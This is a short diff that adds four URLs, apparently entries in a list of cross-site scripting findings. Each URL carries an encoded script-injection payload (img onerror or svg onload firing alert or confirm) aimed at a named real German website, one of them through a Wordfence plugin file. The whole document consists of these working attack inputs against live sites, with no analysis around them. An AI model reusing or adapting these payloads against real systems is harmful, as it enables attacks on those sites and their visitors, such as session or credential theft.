@@ -1,0 +1,4 @@
+http://hallo-nrw.de/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
+http://hamburg-plus.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://heidelinde.btcom.de/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
+https://hallonrw.de/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
